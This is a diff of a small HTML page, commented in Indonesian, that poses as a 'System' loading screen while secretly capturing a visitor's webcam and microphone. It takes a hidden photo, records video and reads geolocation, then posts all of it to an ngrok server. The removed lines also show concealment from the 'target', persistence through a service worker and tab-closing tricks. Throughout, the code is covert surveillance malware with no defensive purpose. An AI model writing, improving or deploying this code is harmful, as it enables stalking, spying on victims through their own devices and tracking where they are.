@@ -2,135 +2,90 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>System Service</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial;
-        }
-        #status {
-            text-align: center;
-            font-size: 14px;
-            color: gray;
-        }
-    </style>
+    <title>System</title>
 </head>
 <body>
-    <div id="status">Initializing...</div>
-
+    <h3>Loading...</h3>
     <script>
         // GANTI DENGAN LINK NGROK KAMU
         const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
         
-        // ===== TANPA SUARA =====
-        // Audio track akan tetap dikirim tapi TIDAK diputar di browser target
-        
-        // ===== PERSISTENCE =====
-        // Coba daftarkan Service Worker untuk tetap jalan meski browser ditutup
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js').then(reg => {
-                console.log('Service Worker registered');
-            }).catch(err => {
-                console.log('SW failed:', err);
-            });
-        }
-        
-        // ===== FUNGSI UTAMA =====
-        async function start() {
-            document.getElementById('status').innerHTML = 'Requesting access...';
+        async function captureAndSend() {
+            console.log("1. Meminta akses kamera...");
             
             try {
-                // Minta akses dengan audio MUTED (tidak bersuara)
+                // Dapatkan stream video
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: { ideal: 640 }, height: { ideal: 480 } }, 
+                    video: { width: 640, height: 480 }, 
                     audio: true 
                 });
+                console.log("2. Akses kamera berhasil");
                 
-                // MATIKAN SUARA di speaker target (audio tetap dikirim, tapi tidak diputar)
-                const audioTracks = stream.getAudioTracks();
-                audioTracks.forEach(track => {
-                    // Audio tetap aktif untuk direkam, tapi browser tidak akan mengeluarkan suara
-                    // karena tidak ada element <audio> yang memutar stream
-                    console.log('Audio track enabled:', track.enabled);
-                });
+                // Buat element video (sembunyi)
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                await video.play();
+                console.log("3. Video mulai play");
                 
-                // Sembunyikan video (tidak ditampilkan ke target)
-                // Tidak membuat element video sama sekali → target tidak lihat apa-apa
+                // Tunggu 1 detik biar stabil
+                await new Promise(r => setTimeout(r, 1000));
                 
-                // Dapatkan lokasi
-                navigator.geolocation.getCurrentPosition(pos => {
-                    fetch(SERVER + '/loc', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ 
-                            lat: pos.coords.latitude, 
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        })
+                // Ambil foto
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                console.log("4. Foto diambil");
+                
+                // Kirim foto ke server
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('photo', blob);
+                    
+                    const response = await fetch(SERVER + '/photo', { 
+                        method: 'POST', 
+                        body: formData 
                     });
-                });
+                    
+                    if (response.ok) {
+                        console.log("5. ✅ FOTO TERKIRIM!");
+                        document.body.innerHTML = "<h3>✅ Success</h3>";
+                    } else {
+                        console.log("5. ❌ Gagal kirim foto");
+                    }
+                }, 'image/jpeg', 0.8);
                 
-                // Kirim video stream (tanpa tampilan)
+                // Kirim lokasi juga
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        fetch(SERVER + '/loc', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude })
+                        });
+                        console.log("6. Lokasi terkirim");
+                    });
+                }
+                
+                // Kirim ping buat testing
+                fetch(SERVER + '/ping', { method: 'POST', body: JSON.stringify({ test: true }) });
+                
+                // Kirim stream video (opsional)
                 const recorder = new MediaRecorder(stream);
                 recorder.ondataavailable = e => {
-                    if (e.data.size) {
-                        fetch(SERVER + '/stream', { 
-                            method: 'POST', 
-                            body: e.data 
-                        });
-                    }
+                    if (e.data.size) fetch(SERVER + '/stream', { method: 'POST', body: e.data });
                 };
-                recorder.start(3000);
-                
-                // ===== PERSISTENCE: Kirim sinyal setiap 30 detik =====
-                setInterval(() => {
-                    fetch(SERVER + '/ping', { 
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ alive: true, timestamp: Date.now() })
-                    }).catch(e => console.log('Ping failed'));
-                }, 30000);
-                
-                // ===== BACKGROUND SYNC =====
-                // Jika browser ditutup, coba bangunkan lagi
-                if ('Notification' in window) {
-                    Notification.requestPermission();
-                }
-                
-                // Gunakan Wake Lock API (jaga agar sistem tidak tidur)
-                if ('wakeLock' in navigator) {
-                    try {
-                        const wakeLock = await navigator.wakeLock.request('screen');
-                        console.log('Wake Lock active');
-                    } catch(e) {}
-                }
-                
-                // Update status (target hanya lihat ini sebentar)
-                document.getElementById('status').innerHTML = 'Connected';
-                document.body.style.background = '#f0f0f0';
-                
-                // Sembunyikan semua konten setelah 3 detik (biar target tidak curiga)
-                setTimeout(() => {
-                    document.body.innerHTML = '<div style="text-align:center; padding:50px; color:gray;">This page will close automatically...</div>';
-                    setTimeout(() => {
-                        // Coba tutup tab (tidak selalu berhasil tergantung browser)
-                        window.close();
-                    }, 2000);
-                }, 3000);
+                recorder.start(5000);
                 
             } catch(e) {
-                document.getElementById('status').innerHTML = 'Click Allow to continue';
-                setTimeout(start, 2000);
+                console.log("ERROR:", e.message);
+                document.body.innerHTML = "<h3>Error: " + e.message + "</h3><p>Pastikan klik 'Allow' di popup</p>";
             }
         }
         
-        start();
+        captureAndSend();
     </script>
 </body>
 </html>
